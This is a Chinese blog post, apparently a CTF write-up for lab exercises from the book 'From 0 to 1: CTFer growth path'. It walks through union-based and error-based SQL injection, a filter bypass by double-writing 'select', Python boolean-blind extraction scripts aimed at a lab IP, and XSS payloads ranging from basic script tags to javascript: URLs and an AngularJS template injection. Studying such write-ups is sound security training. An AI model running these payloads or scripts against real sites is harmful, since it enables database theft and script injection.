@@ -1,0 +1,570 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>从0到1：CTFer成长之路 | Gridea</title>
+<link rel="shortcut icon" href="https://https://jinqipiaopiao.github.io//favicon.ico?v=1624177818252">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://https://jinqipiaopiao.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="从0到1：CTFer成长之路 | Gridea - Atom Feed" href="https://https://jinqipiaopiao.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+SQL注入-1
+进入环境，发现?id=1。我们输入3的时候告诉我们可以获得tips，这里忽略它。
+首先尝试?id=1 and 1=1 和 ?id=1 and 1=2看是否回显页面一样，如果一样就说明不是数字型注入，否则就是字符型注入然后接..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://https://jinqipiaopiao.github.io/">
+  <img class="avatar" src="https://https://jinqipiaopiao.github.io//images/avatar.png?v=1624177818252" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              从0到1：CTFer成长之路
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-05-19
+              </span>
+              <span>
+                17 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <figure data-type="image" tabindex="1"><img src="https://https://jinqipiaopiao.github.io//post-images/1621427565164.png" alt="" loading="lazy"></figure>
+<h1 id="sql注入-1">SQL注入-1</h1>
+<p>进入环境，发现?id=1。我们输入3的时候告诉我们可以获得tips，这里忽略它。<br>
+首先尝试?id=1 and 1=1 和 ?id=1 and 1=2看是否回显页面一样，如果一样就说明不是数字型注入，否则就是字符型注入然后接下里就是构造payload了<br>
+查询字段数的时候保证是正确回显的页面，查询其他信息的时候是错误回显的页面</p>
+<pre><code>?id=1' order by 1,2,3,4,5 --+ || ?id=1' order by 1,2,3,4,5 %23
+</code></pre>
+<p>(%23是#的url编码格式因为如果写成#这样的话就不会在url中了，因为url中的#号代表html页面中的锚点，数据传输过程并不会一起带到后端)       这样的话就不用一个一个的试了</p>
+<pre><code>?id=-1' union select 1,2,3 --+ || ?id=1' and 1=2 select 1,2,3 --+       判断回显位置
+?id=-1' union select 1,database(),3 --+
+?id=-1' union select 1,2,table_name from information_schema.tables where table_schema=database()--+
+?id=-1' union select 1,2,column_name from information_schema.columns where table_name='fl4g'--+
+?id=-1' union select 1,2,fllllag from fl4g --+
+</code></pre>
+<p>答案是：<br>
+n1book{union_select_is_so_cool}</p>
+<h1 id="sql注入-2">SQL注入-2</h1>
+<p>一开始我以为这题环境进不去，后来才发现应该进的是login.php。<br>
+这是一个进行SQL注入的登录页面。我们首先可以在用户名那里试出是字符型注入，可以利用单引号闭合。f12查看一下源码，发现：<br>
+如果觉得太难了，可以在url后加入?tips=1 开启mysql错误提示,使用burp发包就可以看到啦。</p>
+<p>我是这么容易屈服的人吗？肯定不是。在坚决不开错误提示的情况下，我尝试了各种办法发现还是不行。这时候我反应过来了，这题不是用闭合单引号的方式直接登录的，是要获得flag的。因此应该是通过注入来获得数据库的相关信息，而不是所谓的靠万能密码，万能用户名进行登录。因此我换了一种思路，按照爆库的方式来注入，发现存在布尔注入：(这里有两种方法一种是在url尾部增加?tips=1然后通过burpsuite抓包来查询数据（报错注入）另外一种是用大佬的脚本自动生成只不过有点时间长)<br>
+该开始方法一样就是看是什么注入方式：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1621428759107.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1621428763724.png" alt="" loading="lazy"><br>
+<strong>方法一：</strong><br>
+首先给url尾部添加?tips=1(因为如果不添加的话你看不到任何报错这个也是没有办法的办法)burp suite进行抓包然后通过修改name的值在repeater界面来进行查询flag的值这里要用到报错注入</p>
+<p><strong>extractvalue函数</strong></p>
+<pre><code>         查数据库名：id=' and(select extractvalue(1,concat(0x7e,(select database()))))
+        爆表名：id=' and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))
+        爆字段名：id=' and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))
+        爆数据：id=' and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))
+        ————————————————
+        版权声明：本文为CSDN博主「Dar1in9」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
+        原文链接：https://blog.csdn.net/silence1_/article/details/90812612
+</code></pre>
+<p><strong>updatexml</strong></p>
+<pre><code>        爆数据库名：id=' and(select updatexml(1,concat(0x7e,(select database())),0x7e))
+        爆表名：id=' and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))
+        爆列名：id=' and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))
+        爆数据id=' and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))
+        ————————————————
+        版权声明：本文为CSDN博主「Dar1in9」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
+        原文链接：https://blog.csdn.net/silence1_/article/details/90812612
+</code></pre>
+<p>但是这里有一个比较坑的地方就是要双写select不然就会被过滤</p>
+<pre><code>name=admin' order by 1,2,3,4,5 --+&amp;pass=123
+name=admin' and (selselectect updatexml(1,concat(0x7e,(seselectlect database())),0x7e))--+&amp;pass=123
+name=admin' and (selselectect updatexml(1,concat(0x7e,(seselectlect group_concat(table_name) from information_schema.tables where table_schema=database())),0x7e))--+&amp;pass=123
+name=admin' and (selselectect updatexml(1,concat(0x7e,(seselectlect group_concat(column_name) from information_schema.columns where table_name='fl4g')),0x7e))--+&amp;pass=123
+</code></pre>
+<p>正确答案：</p>
+<pre><code>n1book{login_sqli_is_nice}
+</code></pre>
+<p><strong>方法二：</strong><br>
+用脚本进行布尔注入<br>
+知识拓展：<br>
+String模块ascii_letters和digits方法，其中ascii_letters是生成所有字母，从a-z和A-Z,digits是生成所有数字0-9.</p>
+<pre><code>示例如下：
+
+Python
+chars = string.ascii_letters + string.digits
+print(chars)
+abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
+</code></pre>
+<p><strong>数据库长度：</strong></p>
+<pre><code>#coding:utf-8
+
+import requests
+import string
+
+
+dic = string.digits + string.ascii_letters + &quot;!@#$%^&amp;*()_+{}-=&quot;
+right = '8bef'
+worry = '5728'
+url = 'http://10.26.208.172/login.php'
+for i in range(30):
+#key = &quot;admin%1$' and &quot; + &quot;(length(database())=&quot; + str(i) + &quot;)#&quot;
+key = &quot;admin' and &quot; + &quot;(length(database())=&quot; + str(i) + &quot;)#&quot;
+data = {'name':key, 'pass':'123'}
+r = requests.post(url, data=data).text
+#print(r)
+if right in str(r):
+print('the length of database is %s' %i)
+</code></pre>
+<p><strong>数据库名字：</strong></p>
+<pre><code>#coding:utf-8
+
+import requests
+import string
+
+
+
+dic = string.digits + string.ascii_letters + &quot;!@#$%^&amp;*()_+{}-=&quot;
+length=4
+name=''
+right = '8bef'
+worry = '5728'
+url = 'http://10.26.208.172/login.php'
+for j in range(1,length+1):
+for i in range(65,123):
+#key = &quot;admin%1$' and &quot; + &quot;(substr(database(),0,1)=&quot; + i + &quot;)#&quot;
+#key = &quot;admin%1$' and &quot; + &quot;(substr(database(),&quot;+str(j)+&quot;,1)=&quot; + i + &quot;)#&quot;
+key = &quot;admin'&quot;+&quot; and (ascii(substr(database(),%d,1))=%d)#&quot;%(j,i)
+data = {'name':key, 'pass':'111'}
+r = requests.post(url, data=data).text
+if right in str(r):
+name+=chr(i)
+print(name)
+</code></pre>
+<p><strong>表长度</strong></p>
+<pre><code>#coding:utf-8
+
+import requests
+import string
+
+
+
+dic = string.digits + string.ascii_letters + &quot;!@#$%^&amp;*()_+{}-=&quot;
+right = '8bef'
+worry = '5728'
+url = 'http://10.26.208.172/login.php'
+for i in range(30):
+key = &quot;admin' and &quot; + &quot;length((sselectelect table_name FROM information_schema.tables WHERE table_schema=0x6e6f7465 limit 0,1))=&quot; + str(i) + &quot;#&quot;
+data = {'name':key, 'pass':'111'}
+r = requests.post(url, data=data).text
+#print(r)
+if right in str(r):
+print('the length of table is %s' %i)
+</code></pre>
+<p><strong>表名字</strong></p>
+<pre><code>#coding:utf-8
+
+import requests
+import string
+
+
+
+dic = string.digits + string.ascii_letters + &quot;!@#$%^&amp;*()_+{}-=&quot;
+length=4
+name=''
+right = '8bef'
+worry = '5728'
+url = 'http://10.26.208.172/login.php'
+for j in range(1,length+1):
+for i in range(48,123):
+#key = &quot;admin%1$' and &quot; + &quot;(substr(database(),0,1)=&quot; + i + &quot;)#&quot;
+#key = &quot;admin%1$' and &quot; + &quot;(substr(database(),&quot;+str(j)+&quot;,1)=&quot; + i + &quot;)#&quot;
+key = &quot;admin'&quot;+&quot; and (ascii(substr((seselectlect  table_name FROM information_schema.tables WHERE table_schema=0x6e6f7465 limit 0,1),%d,1))=%d)#&quot;%(j,i)
+data = {'name':key, 'pass':'111'}
+r = requests.post(url, data=data).text
+if right in str(r):
+name+=chr(i)
+print(name)
+</code></pre>
+<p><strong>列长度：</strong></p>
+<pre><code>#coding:utf-8
+
+import requests
+import string
+
+
+
+dic = string.digits + string.ascii_letters + &quot;!@#$%^&amp;*()_+{}-=&quot;
+right = '8bef'
+worry = '5728'
+url = 'http://10.26.208.172/login.php'
+for i in range(30):
+key = &quot;admin' and &quot; + &quot;length((seselectlect column_name FROM information_schema.columns WHERE table_name=0x666c3467 limit 0,1))=&quot; + str(i) + &quot;#&quot;
+data = {'name':key, 'pass':'111'}
+r = requests.post(url, data=data).text
+#print(r)
+if right in str(r):
+print('the length of column is %s' %i)
+</code></pre>
+<p><strong>列名字：</strong></p>
+<pre><code>#coding:utf-8
+
+import requests
+import string
+
+
+
+dic = string.digits + string.ascii_letters + &quot;!@#$%^&amp;*()_+{}-=&quot;
+length=4
+name=''
+right = '8bef'
+worry = '5728'
+url = 'http://10.26.208.172/login.php'
+for j in range(1,length+1):
+for i in range(48,123):
+#key = &quot;admin%1$' and &quot; + &quot;(substr(database(),0,1)=&quot; + i + &quot;)#&quot;
+#key = &quot;admin%1$' and &quot; + &quot;(substr(database(),&quot;+str(j)+&quot;,1)=&quot; + i + &quot;)#&quot;
+key = &quot;admin'&quot;+&quot; and (ascii(substr((seselectlect  column_name FROM information_schema.columns WHERE table_name=0x666c3467 limit 0,1),%d,1))=%d)#&quot;%(j,i)
+data = {'name':key, 'pass':'111'}
+r = requests.post(url, data=data).text
+if right in str(r):
+name+=chr(i)
+print(name)
+</code></pre>
+<p><strong>flag长度：</strong></p>
+<pre><code>#coding:utf-8
+
+import requests
+import string
+
+
+
+dic = string.digits + string.ascii_letters + &quot;!@#$%^&amp;*()_+{}-=&quot;
+right = '8bef'
+worry = '5728'
+url = 'http://10.26.208.172/login.php'
+for i in range(60):
+key = &quot;admin' and &quot; + &quot;length((seselectlect flag FROM fl4g limit 0,1))=&quot; + str(i) + &quot;#&quot;
+data = {'name':key, 'pass':'111'}
+r = requests.post(url, data=data).text
+#print(r)
+if right in str(r):
+print('the length of column is %s' %i)
+</code></pre>
+<p><strong>flag：</strong></p>
+<pre><code>#coding:utf-8
+
+import requests
+import string
+
+
+
+dic = string.digits + string.ascii_letters + &quot;!@#$%^&amp;*()_+{}-=&quot;
+length=26
+name=''
+right = '8bef'
+worry = '5728'
+url = 'http://10.26.208.172/login.php'
+for j in range(1,length+1):
+for i in dic:
+#key = &quot;admin%1$' and &quot; + &quot;(substr(database(),0,1)=&quot; + i + &quot;)#&quot;
+#key = &quot;admin%1$' and &quot; + &quot;(substr(database(),&quot;+str(j)+&quot;,1)=&quot; + i + &quot;)#&quot;
+key = &quot;admin'&quot;+&quot; and (ascii(substr((sselectelect flag FROM fl4g limit 0,1),%d,1))=&quot;%j+str(ord(i))+&quot;)#&quot;
+data = {'name':key, 'pass':'111'}
+r = requests.post(url, data=data).text
+if right in str(r):
+name+=i
+print(name)
+</code></pre>
+<p>成功得到flag。</p>
+<p>有一说一，这题最难的地方应该是select双写那个地方。如果不开启mysql错误回显的话，你就只有bool回显，当你的脚本不print内容的时候，你的第一反应应该是脚本写错了，而不是sql语句被过滤了。当你仔细检查后认为脚本没问题，把sql语句亲自放到burp上检查的时候，也很难想到是自己的sql语句被过滤了，因为真的没有任何提示。<br>
+所以这题真的挺考验思维的，是个很不错的题目。</p>
+<h1 id="xss的魔力">XSS的魔力</h1>
+<p><strong>level1</strong><br>
+没啥好说的，没有绕过，直接上才艺就可以了。</p>
+<pre><code>?username=&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p><strong>level2</strong><br>
+f12看源码：</p>
+<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
+	if(location.search == &quot;&quot;){
+		location.search = &quot;?username=xss&quot;
+	}
+	var username = 'xss';
+	document.getElementById('ccc').innerHTML= &quot;Welcome &quot; + escape(username);
+&lt;/script&gt;
+</code></pre>
+<p>我们可以看到username被escape函数编码了，基本上就很难绕过。因此我们从username本身想办法。可以这样构造：</p>
+<pre><code>?username=';alert(1);//
+</code></pre>
+<p>这样username就是这样：</p>
+<pre><code>var username = '';alert(1);//';
+</code></pre>
+<p>成功执行了alert(1)。</p>
+<p><strong>level3</strong><br>
+还是直接f12看源码：</p>
+<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
+	if(location.search == &quot;&quot;){
+		location.search = &quot;?username=xss&quot;
+	}
+	var username = 'xss';
+	document.getElementById('ccc').innerHTML= &quot;Welcome &quot; + username;
+&lt;/script&gt;
+</code></pre>
+<p>还是按照上题那样注入，结果不行，看看源码，发现引号被转义了：</p>
+<pre><code>var username = '\';alert(1);//';
+	document.getElementById('ccc').innerHTML= &quot;Welcome &quot; + username;
+</code></pre>
+<p>但是注意到第三题并没有escape。这时候我一开始犯了一个错误。我忘记了注入点已经在script里了，因此遇到了一些奇怪的问题。不过因为这个问题我并没有解决，因此就放在这里，希望如果有大佬知道可以教教我。。</p>
+<p>我接下来傻傻的注入：</p>
+<pre><code>?username=&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://https://jinqipiaopiao.github.io//post-images/1621431327787.png" alt="" loading="lazy"></figure>
+<p>这和外面的<code>&lt;script&gt;</code>的颜色是一样的，难道字符串里的一样可以闭合吗？我在自己的本地试了试，发现报错了：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1621431332425.png" alt="" loading="lazy"><br>
+有些玄学。我上网查了查，实际上并没有查到一个真正可以解释这个的答案。不过有一些想法：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1621431339457.png" alt="" loading="lazy"><br>
+还有一个解决办法：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1621431343172.png" alt="" loading="lazy"><br>
+考虑到这题单引号已经被转义，因此只能&lt;/script&gt;。在本地果然不报错了：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1621431346852.png" alt="" loading="lazy"><br>
+而且我发现我在本地用document.write的话，可以弹窗！<br>
+但是我发现这题还是不能弹窗。。直到我看到了外面已经有一层script。。。。。</p>
+<p>嗯哼。。。。。上面都是自己的nt行为，接下来开始正确解题。直接alert(1)发现不行后，考虑将js动态写入html中，就是用各种on事件，这里直接这样：</p>
+<pre><code>?username=&lt;img src=1 onerror=alert(1)&gt;
+</code></pre>
+<p><strong>level4</strong><br>
+这题是一个定时重定向的，还是老样子f12看源码：</p>
+<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
+	var time = 10;
+	var jumpUrl;
+	if(getQueryVariable('jumpUrl') == false){
+		jumpUrl = location.href;
+	}else{
+		jumpUrl = getQueryVariable('jumpUrl');
+	}
+	setTimeout(jump,1000,time);
+	function jump(time){
+		if(time == 0){
+			location.href = jumpUrl;
+		}else{
+			time = time - 1 ;
+			document.getElementById('ccc').innerHTML= `页面${time}秒后将会重定向到${escape(jumpUrl)}`;
+			setTimeout(jump,1000,time);
+		}
+	}
+	function getQueryVariable(variable)
+	{
+	       var query = window.location.search.substring(1);
+	       var vars = query.split(&quot;&amp;&quot;);
+	       for (var i=0;i&lt;vars.length;i++) {
+	               var pair = vars[i].split(&quot;=&quot;);
+	               if(pair[0] == variable){return pair[1];}
+	       }
+	       return(false);
+	}
+&lt;/script&gt;
+</code></pre>
+<p>需要对这段JavaScript代码进行审计。<br>
+首先要知道windows.location对象包含的属性：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1621431355360.png" alt="" loading="lazy"><br>
+注意jumpUrl就是我们要跳转的网页，因此我们要注入的点应该是jumpUrl。<br>
+先一步一步审一下代码。getQueryVariable函数里面的query就是?后面的内容，比如http://localhost:3000/level4?123456，这样的话query就是123456。<br>
+vars是query以&amp;作为分隔符分隔后形成的数组。简单来说就是相当于获得了每个参数。<br>
+然后遍历每个参数。将每个参数以=为分隔符再分隔形成数组，这样<code>pair[0]</code>相当于参数名，<code>pair[1]</code>相当于值。接着进行判断，<code>if(pair[0] == variable){return pair[1];}</code><br>
+因此我们直接构造好参数名，就是控制返回的内容。<br>
+因此这样：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1621431359714.png" alt="" loading="lazy"><br>
+这样jumpUrl的值就是我们要跳转的网页。这时候考虑怎么进行XSS，自然就想到了《从0到1：CTFer成长之路》第109面的伪协议和XSS，这部分是关于链接和跳转进行XSS的。因此可以利用js伪协议实现alert:</p>
+<pre><code>?jumpUrl=javascript:alert(1)
+</code></pre>
+<p>只不过你构造好之后，还要等10秒后重定向才可以弹窗。<br>
+<strong>level5</strong><br>
+f12上源码：</p>
+<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
+	if(getQueryVariable('autosubmit') !== false){
+		var autoForm = document.getElementById('autoForm');
+		autoForm.action = (getQueryVariable('action') == false) ? location.href : getQueryVariable('action');
+		autoForm.submit();
+	}else{
+		
+	}
+	function getQueryVariable(variable)
+	{
+	       var query = window.location.search.substring(1);
+	       var vars = query.split(&quot;&amp;&quot;);
+	       for (var i=0;i&lt;vars.length;i++) {
+	               var pair = vars[i].split(&quot;=&quot;);
+	               if(pair[0] == variable){return pair[1];}
+	       }
+	       return(false);
+	}
+&lt;/script&gt;
+</code></pre>
+<p>和level4的代码有些类似。还是进行审计。<br>
+只不过我们的构造要满足两个点：</p>
+<pre><code>if(getQueryVariable('autosubmit') !== false){
+
+autoForm.action = (getQueryVariable('action') == false) ? location.href : getQueryVariable('action');
+</code></pre>
+<p>首先那个if语句不能为false，直接给autosubmit传个值就行了。<br>
+还有就是getQueryVariable(‘action’) 不能为false，然后构造action就可以实现和上一题类似的方式了。<br>
+审计完，理解好代码之后直接构造：</p>
+<pre><code>?autosubmit=1&amp;action=javascript:alert(1)
+</code></pre>
+<p>成功弹窗。<br>
+<strong>level6</strong><br>
+这题f12看不出来多少东西：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1621431373371.png" alt="" loading="lazy"><br>
+尝试输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，发现对左尖括号&lt;进行了html实体编码：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1621431377554.png" alt="" loading="lazy"><br>
+尝试进行编码绕过，但是不行。又尝试了各种办法还是不行。这时候我又去看了一遍书，因为这个环境考的肯定是书上的内容。突然灵机一动，发现《从0到1：CTFer成长之路》第110-111面的二次渲染导致的XSS和这个题目有些像。验证一波：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1621431382028.png" alt="" loading="lazy"><br>
+发现打印出了9，印证了是模板XSS。我们看一下这个环境用的是哪个模板，发现是AngularJS:<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1621431385694.png" alt="" loading="lazy"><br>
+AngularJS Sandbox Bypasses<br>
+https://xz.aliyun.com/t/4638</p>
+<p>————————————————<br>
+版权声明：本文为CSDN博主「bfengj」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/rfrder/article/details/108930033</p>
+<p>————————————————<br>
+版权声明：本文为CSDN博主「bfengj」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/rfrder/article/details/108930033</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#sql%E6%B3%A8%E5%85%A5-1">SQL注入-1</a></li>
+<li><a href="#sql%E6%B3%A8%E5%85%A5-2">SQL注入-2</a></li>
+<li><a href="#xss%E7%9A%84%E9%AD%94%E5%8A%9B">XSS的魔力</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://https://jinqipiaopiao.github.io/post/kuang-jia-lou-dong-thinkphp-xi-lie-lou-dong-jie-zhi-2020-07-20/">
+              <h3 class="post-title">
+                [框架漏洞]Thinkphp系列漏洞【截至2020-07-20】
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://https://jinqipiaopiao.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
